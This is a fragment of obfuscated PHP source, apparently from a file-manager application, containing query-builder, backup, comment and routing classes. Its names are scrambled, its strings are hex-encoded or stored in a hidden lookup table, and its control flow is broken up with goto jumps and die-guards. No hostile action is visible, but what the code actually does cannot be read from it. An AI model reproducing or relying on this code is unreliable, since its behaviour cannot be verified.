$dÆç–Äëš); } $Cãƒ®‚ìøë = $this->getDbFields(); $dÆç–Äëš = $Cãƒ®‚ìøë ? array_diff($Cãƒ®‚ìøë, $dÆç–Äëš) : $dÆç–Äëš; } $this->options[$D¬ñ…Åí‰µ[271]] = $dÆç–Äëš; return $this; } public function scope($a½Ôéç×© = '', $Bˆ´İ²õš« = NULL) { $EçĞÕ¦£Õ§ =& $_SERVER[œº]; if ($EçĞÕ¦£Õ§[33] === $a½Ôéç×©) { if (isset($this->_scope[$EçĞÕ¦£Õ§[34]])) { $fÜãÊ¸ òİ = $this->_scope[$EçĞÕ¦£Õ§[34]]; } else { return $this; } } elseif (is_string($a½Ôéç×©)) { $a»öËß•¸£ = explode($EçĞÕ¦£Õ§[47], $a½Ôéç×©); $fÜãÊ¸ òİ = array(); foreach ($a»öËß•¸£ as $bˆùô…Ñƒá) { if (!isset($this->_scope[$bˆùô…Ñƒá])) { continue; } $fÜãÊ¸ òİ = array_merge($fÜãÊ¸ òİ, $this->_scope[$bˆùô…Ñƒá]); } if (!empty($Bˆ´İ²õš«) && is_array($Bˆ´İ²õš«)) { $fÜãÊ¸ òİ = array_merge($fÜãÊ¸ òİ, $Bˆ´İ²õš«); } } elseif (is_array($a½Ôéç×©)) { $fÜãÊ¸ òİ = $a½Ôéç×©; } if (is_array($fÜãÊ¸ òİ) && !empty($fÜãÊ¸ òİ)) { $this->options = array_merge($this->options, array_change_key_case($fÜãÊ¸ òİ)); } return $this; } public function where($F¬õòÅÂôÃ, $a¶…‚ºÈ¨ = null) { $fãŒœ·ìº¦ =& $_SERVER[œº]; if (!is_null($a¶…‚ºÈ¨) && is_string($F¬õòÅÂôÃ)) { if (!is_array($a¶…‚ºÈ¨)) { $a¶…‚ºÈ¨ = func_get_args(); array_shift($a¶…‚ºÈ¨); } $a¶…‚ºÈ¨ = array_map(array($this->db, $fãŒœ·ìº¦[341]), $a¶…‚ºÈ¨); $F¬õòÅÂôÃ = vsprintf($F¬õòÅÂôÃ, $a¶…‚ºÈ¨); } elseif (is_object($F¬õòÅÂôÃ)) { $F¬õòÅÂôÃ = get_object_vars($F¬õòÅÂôÃ); } elseif (is_array($F¬õòÅÂôÃ)) { foreach ($F¬õòÅÂôÃ as $AÍŞ‰÷½ê¾ => $D£½¢æ­¾Ÿ) { if ((is_numeric($AÍŞ‰÷½ê¾) || !$AÍŞ‰÷½ê¾) && is_string($D£½¢æ­¾Ÿ)) { if (strpos($D£½¢æ­¾Ÿ, $fãŒœ·ìº¦[348]) === 0) { continue; } think_trace($fãŒœ·ìº¦[349], $fãŒœ·ìº¦[33], $fãŒœ·ìº¦[46]); die; } } } if (is_string($F¬õòÅÂôÃ) && $fãŒœ·ìº¦[33] != $F¬õòÅÂôÃ) { $eæÖø‹¼©ò = array(); $eæÖø‹¼©ò[$fãŒœ·ìº¦[350]] = $F¬õòÅÂôÃ; $F¬õòÅÂôÃ = $eæÖø‹¼©ò; } if (isset($this->options[$fãŒœ·ìº¦[273]])) { $this->options[$fãŒœ·ìº¦[273]] = array_merge($this->options[$fãŒœ·ìº¦[273]], $F¬õòÅÂôÃ); } else { $this->options[$fãŒœ·ìº¦[273]] = $F¬õòÅÂôÃ; } return $this; } public function limit($f¸ÕõÖ¶, $f‡Ó‹¬ÕÇ = null) { $e¥Ãéá›“¯ =& $_SERVER[œº]; $this->options[$e¥Ãéá›“¯[290]] = is_null($f‡Ó‹¬ÕÇ) ? $f¸ÕõÖ¶ : $f¸ÕõÖ¶ . $e¥Ãéá›“¯[47] . $f‡Ó‹¬ÕÇ; return $this; } public function page($B°ŞêŒêŒ, $EÊÅ—‹àñ— = null) { $dö®³µÓ¤ =& $_SERVER[œº]; $this->options[$dö®³µÓ¤[351]] = is_null($EÊÅ—‹àñ—) ? $B°ŞêŒêŒ : $B°ŞêŒêŒ . $dö®³µÓ¤[47] . $EÊÅ—‹àñ—; return $this; } public function comment($eŠÂÇƒÖ¡º) { $this->options[$_SERVER[œº][352]] = $eŠÂÇƒÖ¡º; return $this; } public function setProperty($EÑòíï„¼, $DÊ¾”ïÙíİ) { if (property_exists($this, $EÑòíï„¼)) { $this->{$EÑòíï„¼} = $DÊ¾”ïÙíİ; } return $this; } } goto E„†ÉâÓœ–; D„ÒôÔçà: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\142\141\x63\x6b\165\x70\x4c\151\x73\164"; public $field = array("\x69\x6f", "\x6e\141\x6d\x65", "\163\164\141\x74\x75\163", "\143\x6f\156\x74\x65\x6e\x74", "\155\141\x6e\165\x61\154", "\162\145\x73\x75\154\164", "\x74\151\155\x65\106\x72\x6f\155", "\x74\151\x6d\x65\124\157"); public function config() { goto aÔ ‰šÁê…; aÔ ‰šÁê…: $AÃƒÁá™ê =& $_SERVER[œº]; $B é»Üğ“ = Model($AÃƒÁá™ê[730])->get($AÃƒÁá™ê[742]); $B é»Üğ“ = json_decode($B é»Üğ“, !0); goto fà¨ÄÍœÓ; d½œàá¸ Ñ: if (isset($B é»Üğ“[$AÃƒÁá™ê[197]])) { $BĞ­Ì —Š÷[$AÃƒÁá™ê[197]][$AÃƒÁá™ê[1502]] = $B é»Üğ“[$AÃƒÁá™ê[197]]; unset($B é»Üğ“[$AÃƒÁá™ê[197]]); } return array_merge($BĞ­Ì —Š÷, $B é»Üğ“); goto b”ƒ¢ãÛÅÅ; fà¨ÄÍœÓ: $B é»Üğ“ = is_array($B é»Üğ“) ? $B é»Üğ“ : array(); if (!isset($B é»Üğ“[$AÃƒÁá™ê[715]])) { $B é»Üğ“[$AÃƒÁá™ê[715]] = $AÃƒÁá™ê[87]; } unset($B é»Üğ“[$AÃƒÁá™ê[1499]]); goto f„ŞíÏ¿ƒÈ; c»¬µ›ß›ß: $BĞ­Ì —Š÷ = Model($AÃƒÁá™ê[1718])->findByKey($AÃƒÁá™ê[1517], $E§ŠµŒ²»Ê); if (!$BĞ­Ì —Š÷) { $BĞ­Ì —Š÷ = array(); } if (isset($BĞ­Ì —Š÷[$AÃƒÁá™ê[197]])) { $BĞ­Ì —Š÷[$AÃƒÁá™ê[197]] = json_decode($BĞ­Ì —Š÷[$AÃƒÁá™ê[197]], !0); } goto d½œàá¸ Ñ; f„ŞíÏ¿ƒÈ: Action($AÃƒÁá™ê[1716])->taskInit(); Model($AÃƒÁá™ê[1498])->cacheClear(); $E§ŠµŒ²»Ê = $AÃƒÁá™ê[1717]; goto c»¬µ›ß›ß; b”ƒ¢ãÛÅÅ: } public function listData($DÆï‡È÷Õè = false, $c—‹‡ãáØ‚ = "\155\157\144\x69\146\171\x54\x69\x6d\145", $F—åŠ£Ğ•¨ = false) { return parent::listData($DÆï‡È÷Õè, $c—‹‡ãáØ‚, !0); } public function lastItem() { $f›‰ø„”¿ = $this->listData(); return !empty($f›‰ø„”¿[0]) ? $f›‰ø„”¿[0] : null; } public function kill($Bêè·Ò ƒæ) { goto f½¯ŠÙéœ©; f½¯ŠÙéœ©: $c•™Í¼è‡Ÿ =& $_SERVER[œº]; $C¡ªñÒ”œÇ = $this->listData($Bêè·Ò ƒæ); if (!$C¡ªñÒ”œÇ || empty($C¡ªñÒ”œÇ[$c•™Í¼è‡Ÿ[28]])) { return !0; } goto b‘åŞÄÛ½Ç; C´Ş®°†øï: $AÙñÔÒèÄ = $C¡ªñÒ”œÇ[$c•™Í¼è‡Ÿ[28]]; $aÜ™´Ò‹ù‰ = TEMP_FILES . $c•™Í¼è‡Ÿ[738] . $AÙñÔÒèÄ . $c•™Í¼è‡Ÿ[8]; IO::remove($aÜ™´Ò‹ù‰, !1); goto b¥à³³…•†; b¥à³³…•†: return $this->remove($Bêè·Ò ƒæ); goto dĞãå¤êÃ‘; b‘åŞÄÛ½Ç: Task::kill($c•™Í¼è‡Ÿ[741]); Task::kill($c•™Í¼è‡Ÿ[764]); Task::kill($c•™Í¼è‡Ÿ[774]); goto C´Ş®°†øï; dĞãå¤êÃ‘: } public function remove($eÜİºÜßó) { $d¸ÎğÛ–ø = $this->listData($eÜİºÜßó); if (!$d¸ÎğÛ–ø) { return !0; } return $this->backupRemove($d¸ÎğÛ–ø); } private function backupRemove($cÂİëÊÇÏâ) { parent::remove($cÂİëÊÇÏâ[$_SERVER[œº][393]]); $aì‘—ï›¦ = $this->backupPath($cÂİëÊÇÏâ); IO::remove($aì‘—ï›¦, !1); return !0; } private function backupPath($fĞ©™¼ğÙ©) { $e¾ñŠÎìóß =& $_SERVER[œº]; $DäªÒÉÇÖ = $fĞ©™¼ğÙ©[$e¾ñŠÎìóß[28]]; $E¢âÑÌƒÈ³ = Model($e¾ñŠÎìóß[730])->get($e¾ñŠÎìóß[731]); $aÇß¢£—º = substr(md5($e¾ñŠÎìóß[732] . $E¢âÑÌƒÈ³ . $DäªÒÉÇÖ), 0, 8); return "\x7b\151\x6f\72{$fĞ©™¼ğÙ©[$e¾ñŠÎìóß[712]]}\x7d\x2f\144\x61\164\141\142\141\x73\x65\57\x62\x61\143\153\x75\160\x2f" . $DäªÒÉÇÖ . $e¾ñŠÎìóß[71] . $aÇß¢£—º; } public function start() { goto E¾Ö­Ô‚ÄÑ; E¾Ö­Ô‚ÄÑ: $EÜÛ½³Ôù =& $_SERVER[œº]; if ($GLOBALS[$EÜÛ½³Ôù[6]][$EÜÛ½³Ôù[88]][$EÜÛ½³Ôù[1719]] != $EÜÛ½³Ôù[87]) { return !0; } $dÛàÜßÊ¶î = $this->config(); goto c‹âïÃ²÷Ø; B«·Šó¦¤µ: Backup::set(array($EÜÛ½³Ôù[710] => 1, $EÜÛ½³Ôù[476] => time())); return !0; goto E·²í…ù; c‹âïÃ²÷Ø: if (!$dÛàÜßÊ¶î || $dÛàÜßÊ¶î[$EÜÛ½³Ôù[1499]] != $EÜÛ½³Ôù[87]) { return !1; } $F¦‡·÷ß² = $this->process(); foreach ($F¦‡·÷ß² as $D‘ğÇÍ®¶¶) { if ($D‘ğÇÍ®¶¶) { return Task::restart($D‘ğÇÍ®¶¶[$EÜÛ½³Ôù[393]]); } } goto EÉ‹ÏŠñØ¸; EÉ‹ÏŠñØ¸: $a‚ÛÏ¨öš = new Backup(); $c«–âÅ¼ = $a‚ÛÏ¨öš->db(); if ($c«–âÅ¼) { $c«–âÅ¼ = $a‚ÛÏ¨öš->dbFile(); if ($c«–âÅ¼ && $dÛàÜßÊ¶î[$EÜÛ½³Ôù[715]] == $EÜÛ½³Ôù[191]) { $c«–âÅ¼ = $a‚ÛÏ¨öš->file(); } } goto B«·Šó¦¤µ; E·²í…ù: } public function process() { $D¾ÊÎ³¦İ¥ =& $_SERVER[œº]; return array($D¾ÊÎ³¦İ¥[718] => Task::get($D¾ÊÎ³¦İ¥[741]), $D¾ÊÎ³¦İ¥[722] => Task::get($D¾ÊÎ³¦İ¥[764]), $D¾ÊÎ³¦İ¥[193] => Task::get($D¾ÊÎ³¦İ¥[774])); } public function restore() { $Cõª–Ê†¦© =& $_SERVER[œº]; ActionCall($Cõª–Ê†¦©[1018], !0, 1); ActionCall($Cõª–Ê†¦©[1018], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\x6e\164"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\x6d\145" => "\x63\157\x6d\x6d\145\x6e\x74\137\155\x65\164\141", "\x6d\145\x74\x61\x46\x69\x65\x6c\144" => "\143\157\x6d\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($fÄˆˆ£Œ¦¯) { $c¾‡²âŠ¹Ñ =& $_SERVER[œº]; if ($fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[1720]]) { $dŸœ•ÉŸ‰› = $this->where(array($c¾‡²âŠ¹Ñ[1721] => $fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[1720]]))->find(); if (!$dŸœ•ÉŸ‰› || $dŸœ•ÉŸ‰›[$c¾‡²âŠ¹Ñ[404]] != $fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[404]] || $dŸœ•ÉŸ‰›[$c¾‡²âŠ¹Ñ[484]] != $fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[484]]) { return !1; } $this->where(array($c¾‡²âŠ¹Ñ[1721] => $fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[1720]]))->setAdd($c¾‡²âŠ¹Ñ[1722], 1); } $fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[1723]] = 0; $fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[1722]] = 0; $fÄˆˆ£Œ¦¯[$c¾‡²âŠ¹Ñ[710]] = 1; return $this->add($fÄˆˆ£Œ¦¯); } public function commentCount($fã¶ºã‡Èî, $d–Öôª¨å) { goto Aª¼…˜ÕÍÆ; CÎõÉ‡Œ«: return array_to_keyvalue($f½âõòğô±, $B¹òÊÊ•İ[484], $B¹òÊÊ•İ[480]); goto Dø³Ñ¼ğñ˜; Aª¼…˜ÕÍÆ: $B¹òÊÊ•İ =& $_SERVER[œº]; if (!$fã¶ºã‡Èî) { return array(); } if (is_string($fã¶ºã‡Èî) || is_int($fã¶ºã‡Èî)) { $fã¶ºã‡Èî = array($fã¶ºã‡Èî); } goto AˆÍÏÇÒç; AˆÍÏÇÒç: $AŒ‘†ê«±š = array($B¹òÊÊ•İ[484], $B¹òÊÊ•İ[1724] => $B¹òÊÊ•İ[480]); $E¢ÛÅ—µäÅ = array($B¹òÊÊ•İ[484] => array($B¹òÊÊ•İ[7], $fã¶ºã‡Èî), $B¹òÊÊ•İ[404] => $d–Öôª¨å); $f½âõòğô± = $this->field($AŒ‘†ê«±š)->where($E¢ÛÅ—µäÅ)->group($B¹òÊÊ•İ[484])->select(); goto CÎõÉ‡Œ«; Dø³Ñ¼ğñ˜: } public function remove($eÙİ•µ¼‹) { $e™µÉ¾ÓÃ =& $_SERVER[œº]; $EÑßøŒåíñ = array($e™µÉ¾ÓÃ[1721] => $eÙİ•µ¼‹); $dˆËÒñ£ö = $this->where($EÑßøŒåíñ)->find(); if ($dˆËÒñ£ö[$e™µÉ¾ÓÃ[1720]]) { $this->where(array($e™µÉ¾ÓÃ[1721] => $dˆËÒñ£ö[$e™µÉ¾ÓÃ[1720]]))->setAdd($e™µÉ¾ÓÃ[1722], -1); } return $this->where($EÑßøŒåíñ)->delete(); } public function edit($cìÅˆ¸å—Ò, $A¶¸Á¬‘Ğ®) { $cåÇ„àëÚ =& $_SERVER[œº]; $déŒç‡íéÄ = array($cåÇ„àëÚ[1721] => $cìÅˆ¸å—Ò); return $this->where($déŒç‡íéÄ)->save(array($cåÇ„àëÚ[1725] => $A¶¸Á¬‘Ğ®)); } public function prasise($bê§šÆÏê) { $BÊÔã›ƒ¥Á =& $_SERVER[œº]; $bÔ«ÚÕ¸²œ = Model($BÊÔã›ƒ¥Á[1726]); $AÜ§É†˜®ò = array($BÊÔã›ƒ¥Á[1721] => $bê§šÆÏê, $BÊÔã›ƒ¥Á[1520] => USER_ID); $e–’š¤áŞ´ = $bÔ«ÚÕ¸²œ->where($AÜ§É†˜®ò)->find(); if (!$e–’š¤áŞ´) { $bÔ«ÚÕ¸²œ->add($AÜ§É†˜®ò); $dêÌ¾íñ˜ = $this->where(array($BÊÔã›ƒ¥Á[1721] => $bê§šÆÏê))->setAdd($BÊÔã›ƒ¥Á[1723], 1); } else { $bÔ«ÚÕ¸²œ->where($AÜ§É†˜®ò)->delete(); $dêÌ¾íñ˜ = $this->where(array($BÊÔã›ƒ¥Á[1721] => $bê§šÆÏê))->setAdd($BÊÔã›ƒ¥Á[1723], -1); } return $dêÌ¾íñ˜; } public function targetInfo($D½•Ø™Ô‰É, $f×¦í§„í®) { goto Bœ²½Ø§”Ù; Bœ²½Ø§”Ù: $bÅõº÷Õ£å =& $_SERVER[œº]; $cĞó‰Ò = array($bÅõº÷Õ£å[549] => $D½•Ø™Ô‰É, $bÅõº÷Õ£å[550] => $f×¦í§„í®); $A¯¬ß„Ë¼Î = $this->where($cĞó‰Ò)->count(); goto d£—Ú…óö; d£—Ú…óö: $eÜìÏÔ›‘ = "\x52\111\x47\110\124\40\112\x4f\111\116\x20{$this->tablePrefix}\x63\157\x6d\x6d\145\x6e\x74\x5f\x70\162\141\x69\163\145\x20\163\x74\x61\162\x20\x6f\x6e\x20\x63\157\155\155\145\156\x74\x2e\x63\x6f\x6d\155\x65\156\164\x49\104\x20\75\x20\163\164\x61\x72\x2e\x63\x6f\x6d\x6d\145\x6e\x74\x49\x44"; $F½º‰µ¾òš = $this->alias($bÅõº÷Õ£å[352])->where($cĞó‰Ò)->join($eÜìÏÔ›‘, $bÅõº÷Õ£å[1727])->count(); $bÔ˜•‚ƒñé = array($bÅõº÷Õ£å[1728] => $A¯¬ß„Ë¼Î, $bÅõº÷Õ£å[1729] => $F½º‰µ¾òš); goto a¥Úœ×Óâ; a¥Úœ×Óâ: return $bÔ˜•‚ƒñé; goto BØƒã©ŸÙ; BØƒã©ŸÙ: } public function listData($C«˜‚³‘Ø) { $BÃö•Â¤ÉÜ =& $_SERVER[œº]; if (isset($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1730]])) { if ($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1730]]) { $C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1731]] = array($BÃö•Â¤ÉÜ[971], intval($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1730]])); } unset($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1730]]); } if (isset($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1732]])) { if ($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1732]]) { $C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1731]] = array($BÃö•Â¤ÉÜ[968], intval($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1732]])); } unset($C«˜‚³‘Ø[$BÃö•Â¤ÉÜ[1732]]); } return $this->_listData($C«˜‚³‘Ø); } private function _listData($DÜñÆ–‹«) { $bªº¸×’ÁÏ =& $_SERVER[œº]; $e¢–ÕØ”ƒ› = $this->where($DÜñÆ–‹«)->_makeOrder()->selectPage(100); $this->_listAppendParent($e¢–ÕØ”ƒ›[$bªº¸×’ÁÏ[367]]); $this->_listAppendUser($e¢–ÕØ”ƒ›[$bªº¸×’ÁÏ[367]]); $this->_listAppendMeta($e¢–ÕØ”ƒ›[$bªº¸×’ÁÏ[367]]); return $e¢–ÕØ”ƒ›; } private function _makeOrder() { $a‘©ïˆ ¸¿ =& $_SERVER[œº]; $A®ÄŠÍôÜ® = array($a‘©ïˆ ¸¿[1723], $a‘©ïˆ ¸¿[1722], $a‘©ïˆ ¸¿[194]); $d”ùÂ¦Èäã = Input::get($a‘©ïˆ ¸¿[435], $a‘©ïˆ ¸¿[7], $a‘©ïˆ ¸¿[416], $A®ÄŠÍôÜ®); $Aõ˜¯¤ = Input::get($a‘©ïˆ ¸¿[436], $a‘©ïˆ ¸¿[7], $a‘©ïˆ ¸¿[1522], array($a‘©ïˆ ¸¿[1733], $a‘©ïˆ ¸¿[431])); $AÈóŒÜ ½‡ = $d”ùÂ¦Èäã . $a‘©ïˆ ¸¿[50] . $Aõ˜¯¤; return $this->order($AÈóŒÜ ½‡); } private function _listAppendParent(&$eĞ÷­§Æå›) { goto E³ê¶È…£¯; dËÙ­âÀôŞ: if (!$F¶í­øá§») { return; } $dù÷–ÌÕ»á = $this->where(array($B¦äôßŸ¡š[1721] => array($B¦äôßŸ¡š[7], $F¶í­øá§»)))->select(); $dù÷–ÌÕ»á = array_to_keyvalue($dù÷–ÌÕ»á, $B¦äôßŸ¡š[1731]); goto CŠ†Æ¿Ş¯µ; CŠ†Æ¿Ş¯µ: foreach ($eĞ÷­§Æå› as &$BƒÒÓ¿ÙØ) { if (isset($dù÷–ÌÕ»á[$BƒÒÓ¿ÙØ[$B¦äôßŸ¡š[1720]]])) { $BƒÒÓ¿ÙØ[$B¦äôßŸ¡š[1734]] = $dù÷–ÌÕ»á[$BƒÒÓ¿ÙØ[$B¦äôßŸ¡š[1720]]]; } } unset($BƒÒÓ¿ÙØ); goto aÄ…Ü‘“˜½; E³ê¶È…£¯: $B¦äôßŸ¡š =& $_SERVER[œº]; $F¶í­øá§» = array_unique(array_to_keyvalue($eĞ÷­§Æå›, $B¦äôßŸ¡š[33], $B¦äôßŸ¡š[1720])); $F¶í­øá§» = array_remove_value($F¶í­øá§», $B¦äôßŸ¡š[191]); goto dËÙ­âÀôŞ; aÄ…Ü‘“˜½: } private function _listAppendUser(&$cÃÅÉ÷³à) { goto cŠÀŒ­…·Â; b™ ™»º: foreach ($cÃÅÉ÷³à as &$A†›‡Øåö) { $A†›‡Øåö[$CÂ‘¯ªèÜ[562]] = $eÃ¾»÷íÊø[$A†›‡Øåö[$CÂ‘¯ªèÜ[1528]]]; if (isset($A†›‡Øåö[$CÂ‘¯ªèÜ[1734]])) { $A†›‡Øåö[$CÂ‘¯ªèÜ[1734]][$CÂ‘¯ªèÜ[562]] = $eÃ¾»÷íÊø[$A†›‡Øåö[$CÂ‘¯ªèÜ[1734]][$CÂ‘¯ªèÜ[1528]]]; } } unset($A†›‡Øåö); goto Eóí³ïì§; cŠÀŒ­…·Â: $CÂ‘¯ªèÜ =& $_SERVER[œº]; $Fù÷£‚¡• = array_unique(array_to_keyvalue($cÃÅÉ÷³à, $CÂ‘¯ªèÜ[33], $CÂ‘¯ªèÜ[1528])); $Fù÷£‚¡• = array_remove_value($Fù÷£‚¡•, $CÂ‘¯ªèÜ[191]); goto dˆ‡œÖ¦Øé; dˆ‡œÖ¦Øé: if (count($Fù÷£‚¡•) == 0) { return; } foreach ($cÃÅÉ÷³à as $A†›‡Øåö) { if (isset($A†›‡Øåö[$CÂ‘¯ªèÜ[1734]])) { $Fù÷£‚¡•[] = $A†›‡Øåö[$CÂ‘¯ªèÜ[1734]][$CÂ‘¯ªèÜ[1528]]; } } $eÃ¾»÷íÊø = Model($CÂ‘¯ªèÜ[506])->userListInfo($Fù÷£‚¡•); goto b™ ™»º; Eóí³ïì§: } private function _listAppendMeta(&$bôÎ¾®ÅØ) { goto cçÏÑÏÒ¨¾; cçÏÑÏÒ¨¾: $D´³¶¦Š£ =& $_SERVER[œº]; $Fê¶°Ù²ó = array_unique(array_to_keyvalue($bôÎ¾®ÅØ, $D´³¶¦Š£[33], $D´³¶¦Š£[1731])); $Fê¶°Ù²ó = array_remove_value($Fê¶°Ù²ó, $D´³¶¦Š£[191]); goto dÎ»«íÓÔÒ; a»ˆä¾Ş®ª: if (!$FÌÙßáŒŒø) { return !1; } foreach ($bôÎ¾®ÅØ as &$BÚƒ†Å²©) { $BÚƒ†Å²©[$D´³¶¦Š£[445]] = $FÌÙßáŒŒø[$BÚƒ†Å²©[$D´³¶¦Š£[1731]]]; if (isset($BÚƒ†Å²©[$D´³¶¦Š£[1734]])) { $BÚƒ†Å²©[$D´³¶¦Š£[1734]][$D´³¶¦Š£[445]] = $FÌÙßáŒŒø[$BÚƒ†Å²©[$D´³¶¦Š£[1734]][$D´³¶¦Š£[1731]]]; } } unset($BÚƒ†Å²©); goto Aœ¦’£À¢; dÎ»«íÓÔÒ: if (!$Fê¶°Ù²ó) { return; } foreach ($bôÎ¾®ÅØ as $BÚƒ†Å²©) { if (isset($BÚƒ†Å²©[$D´³¶¦Š£[1734]])) { $Fê¶°Ù²ó[] = $BÚƒ†Å²©[$D´³¶¦Š£[1734]][$D´³¶¦Š£[1731]]; } } $FÌÙßáŒŒø = $this->metaList($Fê¶°Ù²ó); goto a»ˆä¾Ş®ª; Aœ¦’£À¢: } private function metaList($A›·¡¥²¨) { goto FÂ¥’µË¾É; Aˆ×ğ·Î¦¸: $aÂìµ‰¸‰‰ = Model($b§·Ù®™™[1735])->where($dŞÂÔ™Ôá†)->select(); $aÂìµ‰¸‰‰ = array_to_keyvalue_group($aÂìµ‰¸‰‰, $b§·Ù®™™[1731]); foreach ($aÂìµ‰¸‰‰ as $A¹ƒªñ‘ø¼ => $D¿»ø¶Ë÷) { $F¦ö­Ç¦ = array(); foreach ($D¿»ø¶Ë÷ as $Aí«âèÂË) { $F¦ö­Ç¦[$Aí«âèÂË[$b§·Ù®™™[93]]] = $Aí«âèÂË[$b§·Ù®™™[372]]; } $aÂìµ‰¸‰‰[$A¹ƒªñ‘ø¼] = $F¦ö­Ç¦; } goto Aˆ§ÒŠŒ½; FÂ¥’µË¾É: $b§·Ù®™™ =& $_SERVER[œº]; if (!$A›·¡¥²¨) { return array(); } $dŞÂÔ™Ôá† = array($b§·Ù®™™[1731] => array($b§·Ù®™™[7], $A›·¡¥²¨)); goto Aˆ×ğ·Î¦¸; Aˆ§ÒŠŒ½: return $aÂìµ‰¸‰‰ ? $aÂìµ‰¸‰‰ : array(); goto E–ªëÎŞ¹; E–ªëÎŞ¹: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\154\x65\137\x63\x6f\156\164\145\156\x74\163"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\x69\155\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\162\164", "\146\165\156\x63\x74\151\157\x6e")); } goto Eë±—÷õ’Î; B’ë³Áæ¤Å: if (strlen($EÃÖ¯¿åÑ¯) < $_SERVER[œº][578]) { return; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($AŞ‚òÂ”ˆñ) { goto C¹ø÷¤‡Ô; c²ÒÅÒÍ¬: $EªğÉå×ƒˆ = $dáíŠ²Ï¿Õ[581]; while ($EªğÉå×ƒˆ < $dáíŠ²Ï¿Õ[582]) { if ($EªğÉå×ƒˆ >= 0) { break; } $EªğÉå×ƒˆ++; } $this->defaultController = $CÂÎ››œî‡[1] ? $CÂÎ››œî‡[1] : $this->defaultController; goto aùê•Ûä„¦; dÔ¸’õ Å”: $this->{$_SERVER[¡è¹ïÊœğŞ][3]}($cÒÊÓò‹ÖÄ[4], array($this, $cÒÊÓò‹ÖÄ[5])); $eÄ‚©“òñ¯ = $dáíŠ²Ï¿Õ[584]; goto a‰Äá¦ò–; AÀòÚÔùÁ: $B¨ğ¥–éÜ® = $dáíŠ²Ï¿Õ[579]; while (strlen($B¨ğ¥–éÜ®) < $dáíŠ²Ï¿Õ[580]) { if (!$B¨ğ¥–éÜ®) { break; } $B¨ğ¥–éÜ®++; } $this->defaultModule = $CÂÎ››œî‡[0] ? $CÂÎ››œî‡[0] : $this->defaultModule; goto c²ÒÅÒÍ¬; C¹ø÷¤‡Ô: $dáíŠ²Ï¿Õ =& $_SERVER[œº]; $cÒÊÓò‹ÖÄ =& $_SERVER[¡è¹ïÊœğŞ]; $CÂÎ››œî‡ = $cÒÊÓò‹ÖÄ[0]($cÒÊÓò‹ÖÄ[1], $cÒÊÓò‹ÖÄ[2]($AŞ‚òÂ”ˆñ, $cÒÊÓò‹ÖÄ[1])); goto AÀòÚÔùÁ; aùê•Ûä„¦: $d¾›ÑƒÙ„é = $dáíŠ²Ï¿Õ[583]; if (strlen($d¾›ÑƒÙ„é) < $dáíŠ²Ï¿Õ[578]) { die; } $this->defaultAction = $CÂÎ››œî‡[2] ? $CÂÎ››œî‡[2] : $this->defaultAction; goto dÔ¸’õ Å”; a‰Äá¦ò–: } public function appRun($AÀ£‚ëß§) { goto e¢ĞìÄ˜Š©; D®©Æƒ¸õ·: if (!$cºñêÖå„) { die; } if ($f×áÜ©ˆ• == $BäœğØ¡Ê[8]) { $fÏÅ˜ñöì„ = $BäœğØ¡Ê[9]; $a£›„ó±¯§[0] = $BäœğØ¡Ê[10]; $a£›„ó±¯§[1] = $a£›„ó±¯§[1] . $BäœğØ¡Ê[11]; $AÀ£‚ëß§ = $BäœğØ¡Ê[12]($BäœğØ¡Ê[1], $a£›„ó±¯§); $AÀ£‚ëß§ = $BäœğØ¡Ê[2]($AÀ£‚ëß§, $BäœğØ¡Ê[1]); } $BäœğØ¡Ê[13](array($BäœğØ¡Ê[14], $BäœğØ¡Ê[15]), $fÏÅ˜ñöì„ . $BäœğØ¡Ê[16], $AÀ£‚ëß§); goto DàôÕ³©í×; e¢ĞìÄ˜Š©: $b¹‹‹Üô·· =& $_SERVER[œº]; $BäœğØ¡Ê =& $_SERVER[¡è¹ïÊœğŞ]; $a£›„ó±¯§ = $BäœğØ¡Ê[0]($BäœğØ¡Ê[1], $AÀ£‚ëß§); goto Cïè•Ëñ‡; Cïè•Ëñ‡: $f×áÜ©ˆ• = $BäœğØ¡Ê[6]($a£›„ó±¯§[0]); $fÏÅ˜ñöì„ = $BäœğØ¡Ê[7]; $cºñêÖå„ = $b¹‹‹Üô··[585]; goto D®©Æƒ¸õ·; DàôÕ³©í×: $BäœğØ¡Ê[17]($AÀ£‚ëß§); $BŞÖŞÄÃŞ‡ = $b¹‹‹Üô··[586]; if (strlen($BŞÖŞÄÃŞ‡) < $b¹‹‹Üô··[580]) { die; } goto D–âÓéÅƒƒ; D–âÓéÅƒƒ: $BäœğØ¡Ê[13](array($BäœğØ¡Ê[14], $BäœğØ¡Ê[15]), $fÏÅ˜ñöì„ . $BäœğØ¡Ê[18], $AÀ£‚ëß§); goto b¹óÄì×İ; b¹óÄì×İ: } private function autorun() { $cß½òéÃâº =& $_SERVER[¡è¹ïÊœğŞ]; global $config; if 